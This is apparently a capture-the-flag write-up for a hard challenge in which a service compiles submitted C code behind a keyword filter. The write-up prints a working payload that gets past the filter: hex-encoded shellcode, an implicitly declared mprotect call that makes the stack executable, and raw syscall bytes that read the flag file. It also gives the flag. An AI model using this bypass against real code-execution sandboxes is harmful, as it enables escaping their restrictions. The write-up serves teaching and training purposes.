# Challenge 05: Schrödinger's Sandbox

**Concept:** C Compiler Sandbox & Shellcode Injection without Strings
**Difficulty:** 🔴 Hard

## Objective
Players connect to a service that accepts raw C code, compiles it using `gcc`, and executes it.
The catch is that strings and standard library functions are effectively unusable due to strict Python-side filtering.
The filter explicitly bans: `#include`, `main`, `system`, `exec`, `"`, `'`, `flag`, `open`, `read`, `write`, `syscall`, and `int 0x80`.

## Solution
How do you write a C program that opens and reads a file without using `""`, `#include`, or the words `open`, `read`, or `write`?

The solution is to inject **raw assembly shellcode** into the program.
Since we cannot use `__asm__("...")` because double quotes are banned, we must construct a C byte array containing the compiled hex bytes of the shellcode.
Because `""` and `''` are banned, we initialize the array using hex literals: `char c[] = { 0x48, 0xb8, ... };`.

However, jumping to an array on the stack will result in a Segmentation Fault because modern `gcc` compiles with a non-executable stack by default (NX bit). We need to mark the memory page as executable using `mprotect`.
Although we cannot `#include <sys/mman.h>`, C allows implicit function declarations. We can simply declare `int mprotect(void*, long, int);` and call it!

Furthermore, the word `flag` is banned, so we cannot push the string `"flag"` in the shellcode if we just use the hex representation of `flag`? No, the Python filter checks the C source code, not the hex values. The word `flag` is not present in `0x66, 0x6c, 0x61, 0x67` (the hex representation of `f`, `l`, `a`, `g`), so it perfectly bypasses the filter.
The word `syscall` is also banned in the C code, but the raw bytes `0x0f, 0x05` bypass this check entirely.

### Exploit Code
The payload submitted to the sandbox:
```c
int mprotect(void*, long, int);
// Shellcode that does open("flag", 0) -> read(fd, buf, 100) -> write(1, buf, 100)
char c[] = { 0x48, 0xb8, 0x66, 0x6c, 0x61, 0x67, 0x0, 0x0, 0x0, 0x0, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x6a, 0x2, 0x58, 0xf, 0x5, 0x48, 0x89, 0xc7, 0x48, 0x89, 0xe6, 0xba, 0x64, 0x0, 0x0, 0x0, 0x48, 0x31, 0xc0, 0xf, 0x5, 0x48, 0x89, 0xc2, 0xbf, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xf, 0x5 };
mprotect((void*)((long)c & ~4095), 4096, 7);
void (*f)() = (void(*)())c;
f();
```

When submitted, the sandbox wraps this in a `main()` function, compiles it without warnings, and executes it, which triggers the shellcode and reads the flag.

## Flag
`BVAULT{1nl1n3_4553mbly_5y5c4ll_m4573r}`
